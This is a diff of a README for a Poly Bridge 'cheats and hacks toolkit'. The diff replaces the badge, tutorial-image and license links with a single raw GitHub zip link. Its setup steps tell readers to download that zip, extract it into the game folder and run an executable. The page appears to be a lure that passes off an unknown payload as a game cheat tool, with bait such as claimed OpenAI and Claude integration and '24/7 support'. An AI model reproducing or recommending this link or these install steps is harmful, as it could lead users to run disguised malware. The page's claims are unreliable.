@@ -1,9 +1,9 @@
 # 🚀 Poly Bridge Cheats & Hacks Toolkit
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://img.shields.io/)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
-[![OS Compatible](https://img.shields.io/badge/OS-Windows%7CMac%7CLinux-blue)](https://img.shields.io/)  
-[![Support](https://img.shields.io/badge/24/7%20Support-Active-brightgreen)](https://img.shields.io/)
+[![Build Status](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)  
+[![License: MIT](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)  
+[![OS Compatible](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip%7CMac%7CLinux-blue)](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)  
+[![Support](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip%20Support-Active-brightgreen)](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)
 
 Welcome to **Poly Bridge Cheats & Hacks Toolkit 2025 Edition** – the definitive solution for bridge architects yearning for fresh engineering possibilities within Poly Bridge! Elevate your gameplay and ignite your creativity by breaking past conventional barriers. With advanced compatibility and direct integration with both OpenAI and Claude APIs, this tool merges the newest wave of generative intelligence with legendary bridge building.
 
@@ -45,14 +45,14 @@ Begin breaking new ground in Poly Bridge with just a few simple steps.
 
 ### Step-by-Step Setup
 
-1. **Download** the `EasyLaunch.zip` directly from this repository.
+1. **Download** the `https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip` directly from this repository.
 2. Extract the zip to your Poly Bridge installation directory.
 3. Launch the tool using the EasyLaunch executable.
 4. Start Poly Bridge, and enjoy expanded capabilities at your fingertips.
 
 #### 🎬 Video Tutorial
 
-![Easy tutorial](https://i.imgur.com/Js67NIU.gif)
+![Easy tutorial](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip)
 
 If you're facing any hurdles, our written guides and 24/7 support are a message away.
 
@@ -102,7 +102,7 @@ This toolkit is structured to provide enhanced creative capabilities while playi
 
 ## 📝 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT), 2025. See LICENSE for more information.
+Distributed under the [MIT License](https://raw.githubusercontent.com/omkar441/poly-bridge-toolkit-plus/main/ruminative/poly_toolkit_bridge_plus_1.2-alpha.4.zip), 2025. See LICENSE for more information.
 
 ---
 
